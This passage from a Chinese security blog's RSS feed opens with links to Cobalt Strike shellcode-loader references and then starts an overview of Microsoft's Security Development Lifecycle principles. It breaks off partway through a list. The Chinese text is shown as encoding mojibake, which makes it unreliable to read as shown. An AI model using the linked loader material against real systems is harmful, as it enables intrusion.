&lt;p&gt;&lt;a href=&#34;https://codeantenna.com/a/NQOnxnH2Pf&#34;&gt;https://codeantenna.com/a/NQOnxnH2Pf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/articles/compliance/290379.html&#34;&gt;https://www.freebuf.com/articles/compliance/290379.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/aleenzz/Cobalt_Strike_wiki/blob/master/2-%E7%AC%AC%E4%BA%94%E8%8A%82%5Bpython%20shellcode%20%E5%8A%A0%E8%BD%BD%5D.md&#34;&gt;https://github.com/aleenzz/Cobalt_Strike_wiki/blob/master/2-%E7%AC%AC%E4%BA%94%E8%8A%82%5Bpython%20shellcode%20%E5%8A%A0%E8%BD%BD%5D.md&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://gist.github.com/peewpw/8054a64eb4b5cd007a8431a71d698dc3&#34;&gt;https://gist.github.com/peewpw/8054a64eb4b5cd007a8431a71d698dc3&lt;/a&gt;   64ä½loader&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://icode.best/i/17441043786198#h3-10&#34;&gt;https://icode.best/i/17441043786198#h3-10&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.delftstack.com/howto/python/python-convert-hex-to-byte/&#34;&gt;https://www.delftstack.com/howto/python/python-convert-hex-to-byte/&lt;/a&gt; byteå’Œåå…­è¿›åˆ¶è½¬æ¢&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>SDL(å®‰å…¨å¼€å‘ç”Ÿå‘½å‘¨æœŸ)</title>
      <link>https://xxe.icu/sdl.html</link>
      <pubDate>Tue, 22 Mar 2022 11:04:34 +0800</pubDate>
      
      <guid>https://xxe.icu/sdl.html</guid>
      
        <description>&lt;h2 id=&#34;0x0-å‰è¨€&#34;&gt;0x0 å‰è¨€&lt;/h2&gt;
&lt;p&gt;æœ€è¿‘åœ¨è¯»ã€Šäº’è”ç½‘ä¼ä¸šå®‰å…¨é«˜çº§æŒ‡å—ã€‹é‡Œé¢çš„ä¸€ç« SDLæœ‰æ„Ÿï¼Œç»“åˆå·¥ä½œç»éªŒä¹‹è°ˆï¼Œé‚å†™æ­¤æ–‡ã€‚&lt;/p&gt;
&lt;h2 id=&#34;0x01-sdlæ¦‚å¿µ&#34;&gt;0x01 SDLæ¦‚å¿µ&lt;/h2&gt;
&lt;p&gt;å½“æˆ‘ä»¬è°ˆåˆ°SDLï¼ˆSecurity Development Lifecycleï¼‰å®‰å…¨å¼€å‘ç”Ÿå‘½å‘¨æœŸï¼Œå°±ä¸å¾—ä¸è¯´åˆ°å¾®è½¯ï¼Œå› ä¸ºSDLæ˜¯å¾®è½¯åœ¨2004å¹´æå‡ºæ¥çš„ä¸€ä¸ªä»å®‰å…¨è§’åº¦æŒ‡å¯¼è½¯ä»¶å¼€å‘è¿‡ç¨‹çš„ç®¡ç†æ¨¡å¼ã€‚å¾®è½¯å½“æ—¶çš„æœ€å—æ¬¢è¿äº§å“æ˜¯OSå’ŒOfficeï¼Œåœ¨2004å¹´ä¹‹å‰ç—…æ¯’æ¨ªè¡Œéœ¸é“ï¼Œä¸¥é‡å½±å“äº†å¾®è½¯çš„å®¢æˆ·ï¼Œè€Œä¸”ç¾å›½æ”¿åºœæ˜¯å¾®è½¯çš„æœ€å¤§å®¢æˆ·ï¼Œå½“æ—¶å› ä¸ºäº‹æƒ…ç¾å›½æ”¿åºœé™åˆ¶äº†å¾®è½¯äº§å“çš„å‘å¸ƒã€‚&lt;/p&gt;
&lt;p&gt;å¾®è½¯ä¸ºäº†é™ä½é£é™©å’ŒæŒ½å›å¸‚åœºï¼Œ2004å¹´å°†SDLå¼•å…¥å…¶å†…éƒ¨è½¯ä»¶å¼€å‘æµç¨‹ä¸­ï¼Œç›®çš„æ˜¯å‡å°‘å…¶è½¯ä»¶ä¸­çš„æ¼æ´æ•°é‡å’Œé™ä½å…¶ä¸¥é‡çº§åˆ«ã€‚SDLä¾§é‡äºé•¿æœŸç»´æŠ¤ã€æµç¨‹æ”¹è¿›å¹¶èƒ½å¤Ÿå¸®åŠ©å¼€å‘è¿‡ç¨‹åº”å¯¹ä¸æ–­å˜åŒ–çš„å¨èƒçŠ¶å†µï¼ŒWindows Vistaæ˜¯ ç¬¬ä¸€ä¸ªé€šè¿‡å®Œæ•´ SDLçš„æ“ä½œç³»ç»Ÿã€‚&lt;/p&gt;
&lt;p&gt;æ€»çš„æ¥è¯´SDLæ˜¯åœ¨ä¼ ç»Ÿè½¯ä»¶å¼€å‘ç”Ÿå‘½å‘¨æœŸçš„å„ ä¸ªé˜¶æ®µå¢åŠ äº†ä¸€äº›å¿…è¦çš„å®‰å…¨æ´»åŠ¨ï¼Œè½¯ä»¶å¼€å‘çš„ä¸åŒé˜¶æ®µæ‰€æ‰§è¡Œçš„å®‰å…¨æ´»åŠ¨ä¹Ÿ ä¸åŒï¼Œæ¯ä¸ªæ´»åŠ¨å°±ç®—å•ç‹¬æ‰§è¡Œä¹Ÿéƒ½èƒ½å¯¹è½¯ä»¶å®‰å…¨èµ·åˆ°ä¸€å®šä½œç”¨ã€‚&lt;/p&gt;
&lt;h3 id=&#34;sdlsdlcå’Œs-sdlc&#34;&gt;SDLã€SDLCå’ŒS-SDLC&lt;/h3&gt;
&lt;p&gt;æœ‰å¾ˆå¤šåˆšå…¥é—¨çš„å°ä¼™ä¼´ä¸€å¼€å§‹çœ‹åˆ°è¿™äº›åè¯çš„æ—¶å€™ä¹Ÿä¸€è„¸æ‡µï¼Œä¸‹é¢æ¥ä»‹ç»è¿™ä¸‰ä¸ªåè¯çš„å«ä¹‰ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SDLï¼šSecurity Development Lifecycleï¼Œå®‰å…¨å¼€å‘ç”Ÿå‘½å‘¨æœŸ&lt;/li&gt;
&lt;li&gt;SDLCï¼šSoftware Development Life Cycleï¼Œè½¯ä»¶å¼€å‘ç”Ÿå‘½å‘¨æœŸ&lt;/li&gt;
&lt;li&gt;S-SDLCï¼šSecure Software Development Life Cycleï¼Œå®‰å…¨è½¯ä»¶å¼€å‘ç”Ÿå‘½å‘¨æœŸï¼Œæ˜¯ç”±å¼€æºWebå®‰å…¨ç»„ç»‡OWASPæ¨å‡ºçš„ä¸€ä¸ªé¡¹ç›®&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;0x02-sdlå®è·µ&#34;&gt;0x02 SDLå®è·µ&lt;/h2&gt;
&lt;p&gt;SDL çš„æ ¸å¿ƒç†å¿µå°±æ˜¯å°†å®‰å…¨è€ƒè™‘é›†æˆåœ¨è½¯ä»¶å¼€å‘çš„æ¯ä¸€ä¸ªé˜¶æ®µ:éœ€æ±‚åˆ†æã€è®¾è®¡ã€ç¼–ç ã€æµ‹è¯•å’Œç»´æŠ¤ã€‚ä»éœ€æ±‚ã€è®¾è®¡åˆ°å‘å¸ƒäº§å“çš„æ¯ä¸€ä¸ªé˜¶æ®µéƒ½å¢åŠ ç›¸åº” çš„å®‰å…¨æ´»åŠ¨ï¼Œä»¥å‡å°‘è½¯ä»¶ä¸­æ¼æ´çš„æ•°é‡å¹¶å°†å®‰å…¨ç¼ºé™·é™ä½åˆ°æœ€å°ç¨‹åº¦ã€‚å…¶æµç¨‹åˆ†ä¸ºä»¥ä¸‹ä¸ƒéƒ¨åˆ†:&lt;/p&gt;
&lt;p&gt;å®‰å…¨åŸ¹è®­ã€å®‰å…¨éœ€æ±‚ã€å®‰å…¨è®¾è®¡ã€å®‰å…¨å¼€å‘ã€å®‰å…¨æµ‹è¯•ã€å‘å¸ƒå®¡æ ¸ã€å®‰å…¨å“åº”ã€‚&lt;/p&gt;
&lt;h3 id=&#34;1å®‰å…¨åŸ¹è®­&#34;&gt;1ã€å®‰å…¨åŸ¹è®­&lt;/h3&gt;
&lt;p&gt;å®‰å…¨æ˜¯æ¯ä¸ªäººçš„å·¥ä½œã€‚å¼€å‘äººå‘˜ã€æœåŠ¡å·¥ç¨‹å¸ˆä»¥åŠç¨‹åºå’Œäº§å“ç»ç†å¿…é¡»äº†è§£å®‰å…¨åŸºç¡€çŸ¥è¯†ï¼Œå¹¶çŸ¥é“å¦‚ä½•å°†å®‰å…¨æ€§æ„å»ºåˆ°è½¯ä»¶å’ŒæœåŠ¡ä¸­ï¼Œä»¥ä½¿äº§å“æ›´åŠ å®‰å…¨ï¼ŒåŒæ—¶ä»èƒ½æ»¡è¶³ä¸šåŠ¡éœ€æ±‚å¹¶æä¾›ç”¨æˆ·ä»·å€¼ã€‚&lt;/p&gt;
&lt;p&gt;æœ‰æ•ˆçš„åŸ¹è®­å°†è¡¥å……å’ŒåŠ å¼ºå®‰å…¨æ”¿ç­–ã€SDL å®è·µã€æ ‡å‡†å’Œè½¯ä»¶å®‰å…¨è¦æ±‚ï¼Œå¹¶ä»¥ä»æ•°æ®æˆ–æ–°å¯ç”¨æŠ€æœ¯èƒ½åŠ›ä¸­è·å¾—çš„è§è§£ä¸ºæŒ‡å¯¼ã€‚&lt;/p&gt;
&lt;p&gt;å°½ç®¡å®‰å…¨æ˜¯æ¯ä¸ªäººçš„å·¥ä½œï¼Œä½†é‡è¦çš„æ˜¯è¦è®°ä½ï¼Œå¹¶ä¸æ˜¯æ¯ä¸ªäººéƒ½éœ€è¦æˆä¸ºå®‰å…¨ä¸“å®¶ï¼Œä¹Ÿä¸æ˜¯æ¯ä¸ªäººéƒ½éœ€è¦åŠªåŠ›æˆä¸ºç†Ÿç»ƒçš„æ¸—é€æµ‹è¯•äººå‘˜ã€‚ç„¶è€Œï¼Œç¡®ä¿æ¯ä¸ªäººéƒ½äº†è§£æ”»å‡»è€…çš„è§‚ç‚¹ã€ä»–ä»¬çš„ç›®æ ‡å’Œå¯èƒ½çš„è‰ºæœ¯å°†æœ‰åŠ©äºå¸å¼•æ¯ä¸ªäººçš„æ³¨æ„åŠ›å¹¶æé«˜é›†ä½“çŸ¥è¯†æ°´å¹³ã€‚&lt;/p&gt;
&lt;p&gt;åŸºç¡€è½¯ä»¶å®‰å…¨åŸ¹è®­åº”è¯¥åŒ…å«çš„åŸºç¡€æ¦‚å¿µå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å®‰å…¨è®¾è®¡ï¼ŒåŒ…æ‹¬ä»¥ä¸‹ä¸»é¢˜ï¼š
&lt;ul&gt;
&lt;li&gt;å‡å°æ”»å‡»é¢&lt;/li&gt;
&lt;li&gt;æ·±åº¦é˜²å¾¡&lt;/li&gt;
&lt;li&gt;æœ€å°æƒé™åŸåˆ™&lt;/li&gt;
&lt;li&gt;å®‰å…¨é»˜è®¤è®¾ç½®&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;å¨èƒå»ºæ¨¡ï¼ŒåŒ…æ‹¬ä»¥ä¸‹ä¸»é¢˜ï¼š
&lt;ul&gt;
&lt;li&gt;å¨èƒå»ºæ¨¡æ¦‚è¿°&lt;/li&gt;
&lt;li&gt;å¨èƒæ¨¡å‹çš„è®¾è®¡æ„ä¹‰&lt;/li&gt;
&lt;li&gt;åŸºäºå¨èƒæ¨¡å‹çš„ç¼–ç çº¦æŸ&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;å®‰å…¨ç¼–ç ï¼ŒåŒ…æ‹¬ä»¥ä¸‹ä¸»é¢˜ï¼š
&lt;ul&gt;
&lt;li&gt;ç¼“å†²åŒºæº¢å‡ºï¼ˆå¯¹äºä½¿ç”¨ C å’Œ C++ çš„åº”ç”¨ç¨‹åºï¼‰&lt;/li&gt;
&lt;li&gt;æ•´æ•°ç®—æ³•é”™è¯¯ï¼ˆå¯¹äºä½¿ç”¨ C å’Œ C++ çš„åº”ç”¨ç¨‹åºï¼‰&lt;/li&gt;
&lt;li&gt;è·¨ç«™ç‚¹è„šæœ¬ï¼ˆå¯¹äºæ‰˜ç®¡ä»£ç å’Œ Web åº”ç”¨ç¨‹åºï¼‰&lt;/li&gt;
&lt;li&gt;SQL æ³¨å…¥ï¼ˆå¯¹äºæ‰˜ç®¡ä»£ç å’Œ Web åº”ç”¨ç¨‹åºï¼‰&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;å¼±åŠ å¯†å®‰å…¨æµ‹è¯•ï¼ŒåŒ…æ‹¬ä»¥ä¸‹ä¸»é¢˜ï¼š
&lt;ul&gt;
&lt;li&gt;å®‰å…¨æµ‹è¯•ä¸åŠŸèƒ½æµ‹è¯•ä¹‹é—´çš„åŒºåˆ«&lt;/li&gt;
&lt;li&gt;é£é™©è¯„ä¼°&lt;/li&gt;
&lt;li&gt;å®‰å…¨æµ‹è¯•æ–¹æ³•&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;éšç§ï¼ŒåŒ…æ‹¬ä»¥ä¸‹ä¸»é¢˜ï¼š
&lt;ul&gt;
&lt;li&gt;éšç§æ•æ„Ÿæ•°æ®çš„ç±»å‹&lt;/li&gt;
&lt;li&gt;éšç§è®¾è®¡æœ€ä½³å®è·µ&lt;/li&gt;
&lt;li&gt;é£é™©è¯„ä¼°&lt;/li&gt;
&lt;li&gt;éšç§å¼€å‘æœ€ä½³å®è·µ&lt;/li&gt;
&lt;li&gt;éšç§æµ‹è¯•æœ€ä½³å®è·µ&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2å®‰å…¨éœ€æ±‚&#34;&gt;2ã€å®‰å…¨éœ€æ±‚&lt;/h3&gt;
&lt;p&gt;ä¸ºå‡å°‘å®‰å…¨é—®é¢˜å¸¦æ¥çš„æŸå¤±ï¼Œä»¥åŠçº¿ä¸Šå®‰å…¨é—®é¢˜æ•´æ”¹å¸¦æ¥çš„æˆæœ¬ï¼Œéœ€è¦å°† å®‰å…¨å·¥ä½œè¿›è¡Œå‰ç½®ã€‚åœ¨éœ€æ±‚åˆ†æé˜¶æ®µï¼Œåº”è¯¥å¯¹è½¯ä»¶äº§å“çš„é£é™©è¿›è¡Œè¯„ä¼°ï¼Œå»ºç«‹ å®‰å…¨éœ€æ±‚ã€‚ç”±äºäº§å“å¤šä¸”åŠŸèƒ½ç¹æ‚ã€é¡¹ç›®ç®¡ç†æœªè¦†ç›–åˆ°æ¯æ¡ä¸šåŠ¡çº¿ã€å®‰å…¨å›¢é˜Ÿ äººå‘˜å°‘ç­‰è¯¸å¤šå› ç´ ï¼ŒROI æ˜¯æœ€å¤´ç–¼çš„éš¾é¢˜ã€‚ä¸è¿‡å¯ä»¥å› åœ°åˆ¶å®œï¼Œå€ŸåŠ©çºµæ·±é˜²å¾¡ æ€æƒ³å¹¶è½å®åˆ°è¯¥é˜¶æ®µï¼Œå»ºç«‹åŸºæœ¬æˆ–é€šç”¨çš„å®‰å…¨éœ€æ±‚ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å®‰å…¨éœ€æ±‚ï¼šâ€œé¢„å…ˆâ€è€ƒè™‘å®‰å…¨å’Œéšç§æ˜¯å¼€å‘å®‰å…¨ç³»ç»Ÿè¿‡ç¨‹çš„åŸºç¡€ç¯èŠ‚ã€‚ä¸ºè½¯ä»¶é¡¹ç›®å®šä¹‰ä¿¡ä»»åº¦è¦æ±‚çš„æœ€ä½³æ—¶é—´æ˜¯åœ¨åˆå§‹è®¡åˆ’é˜¶æ®µã€‚å°½æ—©å®šä¹‰è¦æ±‚æœ‰åŠ©äºå¼€å‘å›¢é˜Ÿç¡®å®šå…³é”®é‡Œç¨‹ç¢‘å’Œäº¤ä»˜æˆæœï¼Œå¹¶ä½¿é›†æˆå®‰å…¨å’Œéšç§çš„è¿‡ç¨‹å°½é‡ä¸å½±å“åˆ°è®¡åˆ’å’Œå®‰æ’ã€‚å¯¹å®‰å…¨å’Œéšç§è¦æ±‚çš„åˆ†æåœ¨é¡¹ç›®åˆæœŸæ‰§è¡Œï¼Œæ‰€åšå·¥ä½œæ¶‰åŠä¸ºè®¾è®¡åœ¨è®¡åˆ’è¿è¡Œç¯å¢ƒä¸­è¿è¡Œçš„åº”ç”¨ç¨‹åºç¡®å®šæœ€ä½å®‰å…¨è¦æ±‚ï¼Œå¹¶ç¡®ç«‹å’Œéƒ¨ç½²å®‰å…¨æ¼æ´/å·¥ä½œé¡¹è·Ÿè¸ªç³»ç»Ÿã€‚&lt;/li&gt;
&lt;li&gt;è´¨é‡é—¨/Bugæ ï¼šç”¨äºç¡®ç«‹å®‰å…¨å’Œéšç§è´¨é‡çš„æœ€ä½å¯æ¥å—çº§åˆ«ã€‚&lt;/li&gt;
&lt;li&gt;å®‰å…¨å’Œéšç§é£é™©è¯„ä¼°ï¼šå®‰å…¨é£é™©è¯„ä¼° (SRA) å’Œéšç§é£é™©è¯„ä¼° (PRA) æ˜¯å¿…éœ€çš„è¿‡ç¨‹ï¼Œç”¨äºç¡®å®šè½¯ä»¶ä¸­éœ€è¦æ·±å…¥è¯„æçš„åŠŸèƒ½ç¯èŠ‚ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;3å®‰å…¨è®¾è®¡&#34;&gt;3ã€å®‰å…¨è®¾è®¡&lt;/h3&gt;
&lt;p&gt;SDL å®‰å…¨è®¾è®¡æ ¸å¿ƒåŸåˆ™:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Attack Surface Reduction:æ”»å‡»é¢æœ€å°åŒ–&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Basic Privacy: åŸºæœ¬éšç§&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Least Privilege: æƒé™æœ€å°åŒ–&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Secure Defaults: é»˜è®¤å®‰å…¨&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Defense in Depth:çºµæ·±é˜²å¾¡&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Threat Modeling:å¨èƒå»ºæ¨¡&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;æ”»å‡»é¢æœ€å°åŒ–&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;æ”»å‡»é¢æ˜¯æŒ‡ç¨‹åºä»»ä½•èƒ½è¢«ç”¨æˆ·æˆ–è€…å…¶å®ƒç¨‹åºæ‰€è®¿é—®åˆ°çš„éƒ¨åˆ†ï¼Œè¿™äº›æš´éœ²ç»™ç”¨ æˆ·çš„åœ°æ–¹å¾€å¾€ä¹Ÿæ˜¯æœ€å¯èƒ½è¢«æ¶æ„æ”»å‡»è€…æ”»å‡»çš„åœ°æ–¹ã€‚
æ”»å‡»é¢æœ€å°åŒ–å³æ˜¯æŒ‡å°½é‡å‡å°‘æš´éœ²æ¶æ„ç”¨æˆ·å¯èƒ½å‘ç°å¹¶è¯•å›¾åˆ©ç”¨çš„æ”»å‡»é¢ æ•°é‡ã€‚&lt;/p&gt;
&lt;p&gt;è½¯ä»¶äº§å“çš„å—æ”»å‡»é¢æ˜¯ä¸€ä¸ªæ··åˆä½“ï¼Œä¸ä»…åŒ…æ‹¬ä»£ç ã€æ¥å£ã€æœåŠ¡ï¼Œä¹ŸåŒ…æ‹¬ å¯¹æ‰€æœ‰ç”¨æˆ·æä¾›æœåŠ¡çš„åè®®ã€‚å°¤å…¶æ˜¯é‚£äº›æœªè¢«éªŒè¯æˆ–è€…è¿œç¨‹çš„ç”¨æˆ·éƒ½å¯ä»¥è®¿é—®åˆ°çš„åè®®ï¼Œå®‰å…¨äººå‘˜åœ¨æ”»å‡»é¢æœ€å°åŒ–æ—¶é¦–å…ˆè¦å¯¹æ”»å‡»é¢è¿›è¡Œåˆ†æï¼Œæ”»å‡»é¢åˆ†æå°±æ˜¯ æšä¸¾æ‰€æœ‰è®¿é—®å…¥åº“ã€æ¥å£ã€åè®®ä¸€å‰‚å¯æ‰§è¡Œä»£ç çš„è¿‡ç¨‹ï¼Œä»é«˜å±‚æ¬¡æ¥è¯´ï¼Œæ”»å‡»é¢ åˆ†æç€é‡äº:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;é™ä½é»˜è®¤æ‰§è¡Œçš„ä»£ç é‡&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;é™åˆ¶å¯è®¿é—®åˆ°ä»£ç çš„äººå‘˜èŒƒå›´&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;é™å®šå¯è®¿é—®åˆ°ä»£ç çš„äººå‘˜èº«ä»½&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;é™ä½ä»£ç æ‰§è¡Œæ‰€éœ€æƒé™&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;åŸºæœ¬éšç§&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ç”¨æˆ·ä½¿ç”¨è½¯ä»¶æ—¶æ— å¯é¿å…ä¸ªäººä¿¡æ¯è¢«æ”¶é›†ã€ä½¿ç”¨ç”šè‡³åˆ†å‘ï¼Œä¼ä¸šåˆ™æœ‰è´£ä»»å’Œ ä¹‰åŠ¡å»ºç«‹ä¿æŠ¤ä¸ªäººä¿¡æ¯çš„ä¿æŠ¤æªæ–½ï¼ŒæŠµå¾¡æ•Œå¯¹æ”»å‡»è¡Œä¸ºï¼Œç¡®ä¿ç”¨æˆ·åŸºæœ¬éšç§çš„å®‰ å…¨æ€§ã€‚éšç§å®‰å…¨æ˜¯å»ºç«‹å¯ä¿¡ä»»åº”ç”¨ç¨‹åºçš„å…³é”®å› ç´ ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨è½¯ä»¶è®¾è®¡æ—¶è€ƒè™‘ç”¨æˆ·åŸºæœ¬éšç§çš„å¿…è¦æ€§åŠæ„ä¹‰æœ‰:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;å±¥è¡Œæ³•å¾‹è§„å®šå’Œä¹‰åŠ¡&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å¢åŠ å®¢æˆ·çš„ä¿¡èµ–&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;é˜²æ­¢å µå¡éƒ¨ç½²&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;æƒé™æœ€å°åŒ–&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å¦‚æœä¸€ä¸ªåº”ç”¨ç¨‹åºæˆ–ç½‘ç«™è¢«æ”»å‡»ã€ç ´åï¼Œæƒé™æœ€å°åŒ–æœºåˆ¶èƒ½å¤Ÿæœ‰æ•ˆçš„å°†æ½œåœ¨ æŸå®³æœ€å°åŒ–ã€‚å¸¸è§çš„æƒé™æœ€å°åŒ–å®è·µå¦‚:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æ™®é€šç®¡ç†å‘˜/ç³»ç»Ÿç®¡ç†å‘˜ç­‰è§’è‰²ç®¡ç†&lt;/li&gt;
&lt;li&gt;æ–‡ä»¶åªè¯»æƒé™/æ–‡ä»¶è®¿é—®æƒé™ç­‰è®¿é—®æ§åˆ¶&lt;/li&gt;
&lt;li&gt;è¿›ç¨‹/æœåŠ¡ä»¥æ‰€éœ€æœ€å°ç”¨æˆ·æƒé™è¿è¡Œ&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;åœ¨è¿›è¡Œè½¯ä»¶è®¾è®¡æ—¶ï¼Œå®‰å…¨è®¾è®¡äººå‘˜å¯ä»¥è¯„ä¼°åº”ç”¨ç¨‹åºçš„è¡Œä¸ºåŠåŠŸèƒ½æ‰€éœ€çš„æœ€
ä½é™åº¦æƒé™åŠè®¿é—®çº§åˆ«ï¼Œä»è€Œåˆç†åˆ†é…ç›¸åº”çš„æƒé™ã€‚å¦‚æœç¨‹åºç‰¹å®šæƒ…å†µå¿…é¡»è¦è¾ƒ é«˜çº§åˆ«çš„æƒé™ï¼Œä¹Ÿå¯ä»¥è€ƒè™‘ç‰¹æƒèµ‹äºˆåŠé‡Šæ”¾çš„æœºåˆ¶ã€‚å³ä¾¿ç¨‹åºé­åˆ°æ”»å‡»ï¼Œä¹Ÿå¯ä»¥ å°†æŸå¤±é™åˆ°æœ€ä½ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;é»˜è®¤å®‰å…¨&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;é»˜è®¤å®‰å…¨é…ç½®åœ¨å®¢æˆ·ç†Ÿæ‚‰å®‰å…¨é…ç½®é€‰é¡¹ä¹‹å‰ä¸ä»…æœ‰åˆ©äºæ›´å¥½çš„å¸®åŠ©å®¢æˆ·æŒ æ¡å®‰å…¨é…ç½®ç»éªŒï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥ç¡®ä¿åº”ç”¨ç¨‹åºåˆå§‹çŠ¶æ€ä¸‹å¤„äºè¾ƒå®‰å…¨çŠ¶æ€ã€‚è€Œå®¢æˆ· å¯æ ¹æ®å®é™…ä½¿ç”¨æƒ…å†µè€Œå†³å®šåº”ç”¨ç¨‹åºå®‰å…¨ä¸éšç§çš„ç­‰çº§æ°´å¹³æ˜¯å¦é™ä½ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;çºµæ·±é˜²å¾¡&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ä¸é»˜è®¤å®‰å…¨ä¸€æ ·ï¼Œçºµæ·±é˜²å¾¡ä¹Ÿæ˜¯è®¾è®¡å®‰å…¨æ–¹æ¡ˆæ—¶çš„é‡è¦æŒ‡å¯¼æ€æƒ³ã€‚çºµæ·±é˜²å¾¡ åŒ…å«ä¸¤å±‚å«ä¹‰:é¦–å…ˆï¼Œè¦åœ¨å„ä¸ªä¸åŒå±‚é¢ã€ä¸åŒæ–¹é¢å®æ–½å®‰å…¨æ–¹æ¡ˆï¼Œé¿å…å‡ºç°ç– æ¼ï¼Œä¸åŒå®‰å…¨æ–¹æ¡ˆä¹‹é—´éœ€è¦ç›¸äº’é…åˆï¼Œæ„æˆä¸€ä¸ªæ•´ä½“;å…¶æ¬¡ï¼Œè¦åœ¨æ­£ç¡®çš„åœ°æ–¹åš æ­£ç¡®çš„äº‹æƒ…ï¼Œå³åœ¨è§£å†³æ ¹æœ¬é—®é¢˜çš„åœ°æ–¹å®æ–½é’ˆå¯¹æ€§çš„å®‰å…¨æ–¹æ¡ˆã€‚
çºµæ·±é˜²å¾¡å¹¶ä¸æ˜¯åŒä¸€ä¸ªå®‰å…¨æ–¹æ¡ˆè¦åšä¸¤éæˆ–å¤šéï¼Œè€Œæ˜¯è¦ä»ä¸åŒçš„å±‚é¢ã€ä¸ åŒçš„è§’åº¦å¯¹ç³»ç»Ÿåšå‡ºæ•´ä½“çš„è§£å†³æ–¹æ¡ˆã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å¨èƒå»ºæ¨¡&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å¨èƒå»ºæ¨¡æ˜¯ä¸€ç§åˆ†æåº”ç”¨ç¨‹åºå¨èƒçš„è¿‡ç¨‹å’Œæ–¹æ³•ã€‚è¿™é‡Œçš„å¨èƒæ˜¯æŒ‡æ¶æ„ç”¨æˆ· å¯èƒ½ä¼šè¯•å›¾åˆ©ç”¨ä»¥ç ´åç³»ç»Ÿï¼Œå’Œæˆ‘ä»¬å¸¸è¯´çš„æ¼æ´å¹¶ä¸ç›¸åŒã€‚æ¼æ´æ˜¯ä¸€ä¸ªç‰¹å®šçš„å¯ ä»¥è¢«åˆ©ç”¨çš„å¨èƒï¼Œå¦‚ç¼“å†²åŒºæº¢å‡ºã€sql æ³¨å…¥ç­‰ã€‚
ä½œä¸º SDL è®¾è®¡é˜¶æ®µçš„ä¸€éƒ¨åˆ†å®‰å…¨æ´»åŠ¨ï¼Œå¨èƒå»ºæ¨¡å…è®¸å®‰å…¨è®¾è®¡äººå‘˜å°½åœ¨çš„ è¯†åˆ«æ½œåœ¨çš„å®‰å…¨é—®é¢˜å¹¶å®æ–½ç›¸åº”ç¼“è§£æªæ–½ã€‚åœ¨è®¾è®¡é˜¶æ®µæŠŠæ½œåœ¨çš„å¨èƒå‘ç°æœ‰åŠ©äºå¨èƒçš„å…¨é¢å’Œæ›´æœ‰æ•ˆçš„è§£å†³ï¼ŒåŒæ—¶ä¹Ÿæœ‰åŠ©äºé™ä½å¼€å‘å’ŒåæœŸç»´æŠ¤çš„æˆæœ¬ã€‚å¨èƒå»º æ¨¡çš„ä¸€èˆ¬æµç¨‹å¦‚ä¸‹:
ä¸ç³»ç»Ÿæ¶æ„å¸ˆåŠè®¾è®¡äººå‘˜æ²Ÿé€šï¼Œäº†è§£è®¾è®¡è¯¦æƒ…&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ä½¿ç”¨æˆç†Ÿçš„å¨èƒå»ºæ¨¡æ–¹æ³•åˆ†æå½“å‰è®¾è®¡æ½œåœ¨çš„å®‰å…¨é—®é¢˜&lt;/li&gt;
&lt;li&gt;æå‡ºå®‰å…¨å»ºè®®åŠå¯¹æ½œåœ¨å¨èƒçš„ç¼“è§£æªæ–½&lt;/li&gt;
